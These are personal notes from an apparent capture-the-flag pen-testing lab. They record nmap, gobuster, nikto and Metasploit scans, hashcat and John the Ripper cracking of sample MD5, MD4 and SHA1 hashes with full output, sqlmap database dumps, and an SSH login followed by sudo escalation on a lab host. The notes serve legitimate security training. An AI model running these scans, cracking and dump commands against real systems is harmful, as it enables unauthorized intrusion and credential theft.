# CC: Pen Testing
# Data: 22.09.2020

IP:`10.10.30.160`, `10.10.157.224`, `10.10.203.12`, `10.10.166.60`
-------------
1. initil scan: `nmap -sC -sV -A -vv -p- -oN initial/nmap 10.10.30.160`
	results in initial/nmap

2. netcat

3. gobuster scan: `gobuster dir -u http://10.10.157.224 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o initial/gobuster.log` 
	found dir `/secret`

   `gobuster dir -u http://10.10.157.224 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o initial/gobuster.log -x xx`
	found hidden file: `password.xxs`

3. nikto

4. metaspoit:
	- `msfdb init`
	- `msfconsol`e
	- `db_status`
	- `db_nmap -sC -sV -vv -A -p- -oN initial/namap 10.10.203.12`

5. hashcat
	- mods for hashcat `https://hashcat.net/wiki/doku.php?id=example_hashes`
	- crack MD5: 56ab24c15b72a457069c5ea42fcfc640 : happy
	- crack MD4: 4bc9ae2b9236c2ad02d81491dcb51d5f : nootnoot


> needed to use -force flg, coz of VM env.

-using hash file
	///
hashcat --force -m 0 hashes /opt/rockyou.txt 
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz, 1024/2954 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.                                                                                                 
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'                                      
* Device #1: Kernel m00000_a0-pure.139c8e7b.kernel not found in cache! Building may take a while...
Dictionary cache built:
* Filename..: /opt/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

56ab24c15b72a457069c5ea42fcfc640:happy           
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 56ab24c15b72a457069c5ea42fcfc640
Time.Started.....: Wed Sep 23 09:46:44 2020 (0 secs)
Time.Estimated...: Wed Sep 23 09:46:44 2020 (0 secs)
Guess.Base.......: File (/opt/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    33973 H/s (0.36ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> oooooo

Started: Wed Sep 23 09:46:28 2020
Stopped: Wed Sep 23 09:46:46 2020

	///

-using hash
	///
hashcat --force -m 900 4bc9ae2b9236c2ad02d81491dcb51d5f /opt/rockyou.txt 
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz, 1024/2954 MB allocatable, 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.                                                                                                 
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=900 -D _unroll'                                    
* Device #1: Kernel m00900_a0-pure.d19531b6.kernel not found in cache! Building may take a while...
Dictionary cache hit:
* Filename..: /opt/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

4bc9ae2b9236c2ad02d81491dcb51d5f:nootnoot        
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD4
Hash.Target......: 4bc9ae2b9236c2ad02d81491dcb51d5f
Time.Started.....: Wed Sep 23 09:48:58 2020 (1 sec)
Time.Estimated...: Wed Sep 23 09:48:59 2020 (0 secs)
Guess.Base.......: File (/opt/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   856.0 kH/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 839680/14344385 (5.85%)
Rejected.........: 0/839680 (0.00%)
Restore.Point....: 835584/14344385 (5.83%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: odyssey26 -> ninjas2

Started: Wed Sep 23 09:48:44 2020
Stopped: Wed Sep 23 09:49:01 2020

	///


6. JackTheRipper (jtr)
- hash craked using `sudo /opt/JohnTheRipper/run/john --wordlist=/opt/rockyou.txt --format=raw-md5 md5.tx`

result: 
`Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
hello            (?)
1g 0:00:00:00 DONE (2020-09-23 13:32) 25.00g/s 9600p/s 9600c/s 9600C/s 123456..michael1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. `

- 2nd hash cracker using `sudo /opt/JohnTheRipper/run/john --wordlist=/opt/rockyou.txt --format=raw-sha1 sha1.txt`

result: 
`Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (?)
1g 0:00:00:00 DONE (2020-09-23 13:34) 7.142g/s 57.14p/s 57.14c/s 57.14C/s 123456..rockyou
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. `


7. SQLmap
	- `sqlmap -u http://10.10.166.60 --forms`
	- `sqlmap -u http://10.10.166.60 --forms -a`
		db name: tests	
	- `sqlmap -u http://10.10.166.60 --forms -D tests --dump-all`

8. smbmap

# ----- Final Exam -----

found at p.80 unconfiguref Apache2 on Ubuntu server: Apache httpd 2.4.18

1. `nmap -sC -sV -vv -A -p- -oN initial/nmapFinal 10.10.24.73`
	found 2 open ports: 22, 80
	OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	Apache httpd 2.4.18

2. `gobuster dir -u http://10.10.24.73 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt` 
	found dir `/secret`
`gobuster dir -u http://10.10.24.73/secret -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,html -t40`
	found file with possible login and hash pass: nyan:046385855FC9580393853D8E81F240B66FE9A7B8
	cracked hash :)`sudo /opt/JohnTheRipper/run/john --wordlist=/opt/rockyou.txt --format=raw-sha1 hashFinal.txt `

3. metaspoit	
	initial scan `db_nmap -sC -sV -A --script vuln 10.10.24.73`


4. `nikto -host 10.10.24.73 | tee initial/niktoFinal.log`
	initial scan

------------
ssh: nyan:nyan to get 1st flag, sudo su - to get 2nd
------------

